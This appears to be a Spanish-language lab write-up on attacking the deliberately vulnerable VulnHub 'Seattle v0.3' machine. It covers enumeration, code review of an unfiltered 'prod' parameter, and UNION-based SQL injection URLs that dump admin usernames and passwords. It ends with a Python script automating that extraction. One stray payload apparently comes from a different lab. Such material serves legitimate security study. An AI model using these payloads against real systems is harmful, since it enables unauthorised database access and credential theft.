# Seattle Sounds

## How to:

1. Dar especial atención a recursos que no requieran autenticación
2. Localizar SQLi en el código
3. Comprobar si son explotables por un usuario externo 
4. URL: https://www.vulnhub.com/entry/seattle-v03,145/
   1. User: root
   2. Password: PASSWORD

## Fase I: Information Gathering

1. **Obtención de cabeceras**

   ![cabeceras](/Users/nyanyi/Datos/Material_estudio/Offensive_secu/Awae/Preparacion/maquinas_preparacion/seattle/evidencias/cabeceras.png)

Resultados: 
-	Lenguaje: PHP/5.6.14
-	Server web: Apache/2.4.16
-	Sistema operativo: Fedora


2. **Enumeración de directorios**

![2-directorios](/Users/nyanyi/Datos/Material_estudio/Offensive_secu/Awae/Preparacion/maquinas_preparacion/seattle/evidencias/2-directorios.png)

Resultados:

- Código 200
  - /info.php
  - /index.php
- Especial atención:
  - /admin (d)
  - /downloads (d)
  - /images (d)
  - /manual (d)
  - /theme (d)



## Fase 2: Analisis de código

1. Al tratarse de una web, la primera aproximación es ver si hay alguna inyección SQL

![3-sql](/Users/nyanyi/Datos/Material_estudio/Offensive_secu/Awae/Preparacion/maquinas_preparacion/seattle/evidencias/3-sql.png)

2. En base a los resultados obtenidos, se realiza otra búsqueda más completa:

![3-sql_completada](/Users/nyanyi/Datos/Material_estudio/Offensive_secu/Awae/Preparacion/maquinas_preparacion/seattle/evidencias/3-sql_completada.png)

3. Revisión del fichero pictures. Ahora lo que interesa es ver si es posible que los parámetros "id" o "cat" sean accesibles por el usuario y si hay alguna función de filtrado.

### Analisis del fichero Prod-details

![file_prod_details](/Users/nyanyi/Datos/Material_estudio/Offensive_secu/Awae/Preparacion/maquinas_preparacion/seattle/evidencias/file_prod_details.png)

- El parámetro "PROD" es transferido mediante una petición GET
- Si la cookie es LEVEL = 1 no se aplica ningún tipo de filtrado
- El parámetro PROD que es  controlado por el usuario se concatena, sin filtrado, en la SQL.
- Ahora hay que localizar donde se interactúa con este fichero: details.php

![4-Uso_file_prod_details](/Users/nyanyi/Datos/Material_estudio/Offensive_secu/Awae/Preparacion/maquinas_preparacion/seattle/evidencias/4-Uso_file_prod_details.png)

- A su vez, el fichero details.php es accesible desde: display.php

![5-Uso_file_details](/Users/nyanyi/Datos/Material_estudio/Offensive_secu/Awae/Preparacion/maquinas_preparacion/seattle/evidencias/5-Uso_file_details.png)

- Y finalmente el fichero display.php es utilizado en el fichero: product.php

![5-Uso_file_display](/Users/nyanyi/Datos/Material_estudio/Offensive_secu/Awae/Preparacion/maquinas_preparacion/seattle/evidencias/5-Uso_file_display.png)

De esta manera, en la aplicación web, se conoce que se ha de acceder al fichero products.php y a partir de ahí, con Burp, analizar el flujo y ver que peticiones GET se están utilizando hasta llegar a la debilidad detectada.

![8-menu_prodcuts](/Users/nyanyi/Datos/Material_estudio/Offensive_secu/Awae/Preparacion/maquinas_preparacion/seattle/evidencias/8-menu_prodcuts.png)Otra posibilidad, seria, probar directamente con una petición GET con el parámetro PROD y la cookie level=1

#### Comprobación

1. La configuración es:

   ![9-configuracion](/Users/nyanyi/Datos/Material_estudio/Offensive_secu/Awae/Preparacion/maquinas_preparacion/seattle/evidencias/9-configuracion.png)

2. Resultado:

   ​		![9-configuracion_response](/Users/nyanyi/Datos/Material_estudio/Offensive_secu/Awae/Preparacion/maquinas_preparacion/seattle/evidencias/9-configuracion_response.png)

   

   Y en el caso de inyección SQL:

   ![9-configuracion_response_inyeccion](/Users/nyanyi/Datos/Material_estudio/Offensive_secu/Awae/Preparacion/maquinas_preparacion/seattle/evidencias/9-configuracion_response_inyeccion.png)

   La debilidad detectada en el código es accesible y explotada. Hay vulnerabilidad.

## Fase 3: Explotación de la SQLi

1. Identificación del gestor de la Database

   - En el error SQL obtenido anteriormente se informa que es MariaDB. MariaDB es un sistema de gestión de bases de datos derivado de Mysql.

2. Número de columnas

   - http://192.168.1.14/prod-details.php?prod=1+ORDER+BY+10

   - http://192.168.1.14/prod-details.php?prod=1+ORDER+BY+6

     ![10-error_columns](/Users/nyanyi/Datos/Material_estudio/Offensive_secu/Awae/Preparacion/maquinas_preparacion/seattle/evidencias/10-error_columns.png)

   - http://192.168.1.14/prod-details.php?prod=1+ORDER+BY+4

     ![10-error_columns4](/Users/nyanyi/Datos/Material_estudio/Offensive_secu/Awae/Preparacion/maquinas_preparacion/seattle/evidencias/10-error_columns4.png)

   - http://192.168.1.14/prod-details.php?prod=1+ORDER+BY+5

     ![10-true_columns5](/Users/nyanyi/Datos/Material_estudio/Offensive_secu/Awae/Preparacion/maquinas_preparacion/seattle/evidencias/10-true_columns5.png)

     - Hay 5 columnas

3. Consideración sobre lo que se muestra por pantalla

      1. En el código del fichero "prod-details.php" se puede ver que lo único que se mostrara por pantalla es lo siguiente:

            ![11-resultados por pantalla](/Users/nyanyi/Datos/Material_estudio/Offensive_secu/Awae/Preparacion/maquinas_preparacion/seattle/evidencias/11-resultados por pantalla.png)

            

            Al utilizar la función mysql_fetch_assoc, unicamente se obtiene una fila, por lo que los resultados del UNION no se mostraran. Es por este motivo que se ha de usar un indice de articulo que no exista, como -1.

4. Identificación de la versión

   - http://192.168.1.14/prod-details.php?prod=-1+UNION+SELECT+NULL%2CNULL%2CVERSION%28%29%2CNULL%2CNULL

   ![12-Version](/Users/nyanyi/Datos/Material_estudio/Offensive_secu/Awae/Preparacion/maquinas_preparacion/seattle/evidencias/12-Version.png)

5. Usuario de ejecución

   - http://192.168.1.14/prod-details.php?prod=-1+UNION+SELECT+NULL%2CNULL%2CUSER%28%29%2CNULL%2CNULL

     ![13-users](/Users/nyanyi/Datos/Material_estudio/Offensive_secu/Awae/Preparacion/maquinas_preparacion/seattle/evidencias/13-users.png)

   

6. Información database

   - http://192.168.1.14/prod-details.php?prod=-1+UNION+SELECT+NULL%2CNULL%2Cschema_name%2CNULL%2CNULL+FROM+information_schema.schemata+WHERE+schema_name+NOT+LIKE+%27%25schema%25%27+AND++schema_name+NOT+LIKE++%27%25mysql%25%27

   ![14-table](/Users/nyanyi/Datos/Material_estudio/Offensive_secu/Awae/Preparacion/maquinas_preparacion/seattle/evidencias/14-table.png)

7. Tablas de seattle

      - http://192.168.1.14/prod-details.php?prod=-1+UNION+SELECT+NULL%2CNULL%2Ctable_name%2CNULL%2CNULL+FROM+information_schema.tables+WHERE+table_schema+%3D+%27seattle%27

        ![15-tablas](/Users/nyanyi/Datos/Material_estudio/Offensive_secu/Awae/Preparacion/maquinas_preparacion/seattle/evidencias/15-tablas.png)

      - http://192.168.1.14/prod-details.php?prod=-1+UNION+SELECT+NULL%2CNULL%2Ctable_name%2CNULL%2CNULL+FROM+information_schema.tables+WHERE+table_schema+%3D+%27seattle%27+AND+WHERE+table_name+NOT+LIKE+%27%25tblBlogs%25%27

        - tblMembers
        - tblProducts

8. Columnas

      En este caso, para sacar las columnas, la SELECT la realizaremos con LIMIT

      - http://192.168.1.14/prod-details.php?prod=-1+UNION+SELECT+NULL%2CNULL%2Ccolumn_name%2CNULL%2CNULL+FROM+information_schema.columns+WHERE+table_schema+%3D+%27seattle%27+AND+table_name+%3D+%27tlbMembers%27

      

9. Datos de user:password

      - http://172.16.113.157/cat.php?id=2+UNION+SELECT+NULL%2Cconcat_ws(%27+:+%27+%2Cid%2Clogin%2Cpassword)%2CNULL%2CNULL+FROM+photoblog.users

      ![16-id](/Users/nyanyi/Datos/Material_estudio/Offensive_secu/Awae/Preparacion/maquinas_preparacion/seattle/evidencias/16-id.png)

      - http://192.168.1.14/prod-details.php?prod=-1+UNION+SELECT+NULL%2CNULL%2Ccolumn_name%2CNULL%2CNULL+FROM+information_schema.columns+WHERE+table_schema+%3D+%27seattle%27+AND+table_name+%3D%27tblMembers%27+LIMIT+1%2C1

        ![17-username](/Users/nyanyi/Datos/Material_estudio/Offensive_secu/Awae/Preparacion/maquinas_preparacion/seattle/evidencias/17-username.png)

        - id
        - username
        - password
        - session
        - blog
        - admin
        - name


## Fase 4: Obtención de las credenciales usuario admin

1. Credenciales del admin: 
   
   - http://192.168.1.14/prod-details.php?prod=-1+UNION+SELECT+NULL%2CNULL%2Cconcat_ws%28%27+%3A+%27+%2Cusername%2Cpassword%29+NULL%2CNULL+FROM+tblMembers
   
   ![18-credenciales](/Users/nyanyi/Datos/Material_estudio/Offensive_secu/Awae/Preparacion/maquinas_preparacion/seattle/evidencias/18-credenciales.png)
   
   
   
   ![18-final](/Users/nyanyi/Datos/Material_estudio/Offensive_secu/Awae/Preparacion/maquinas_preparacion/seattle/evidencias/18-final.png)

## Fase 5: Automatización

```python
import requests
from sys import argv
from colorama import Fore, Back, Style

#Configuration
target="192.168.1.14/prod-details.php"
url = "http://" + target
payload = {'prod':"-1 UNION SELECT NULL,NULL,concat_ws(' : ' ,username,password), NULL,NULL FROM tblMembers"}
cookies=dict(level="1")
parameters='y'
method='GET'

#functions


def requests_get_params(url, payload):
    r = requests.get(url, params=payload, cookies=cookies, verify=False)
    response(r)

def requests_get_simple(url):
    r = requests.get(url, verify=False)
    response(r)

def response(get_response): 
    r = get_response
    print(format_text('Url is: ', r.url))
    print(format_text('Status_code is: ', r.status_code))
    print(format_text('Cookies is: ',r.cookies))
    print(format_text('Headers are: ', r.headers))
    print(format_text('Text is: ',r.text))

def format_text(title,item):
    cr='\r\n'
    section_break = cr + "*" * 25 +cr
    item = str(item)
    text = Style.BRIGHT + Fore.RED + title + Fore.RESET + section_break + item + section_break
    return text

def main():

    if parameters == 'n':
        requests_get_simple(url)

    else:
        requests_get_params(url, payload)

#start

if __name__== "__main__":
    main()
```

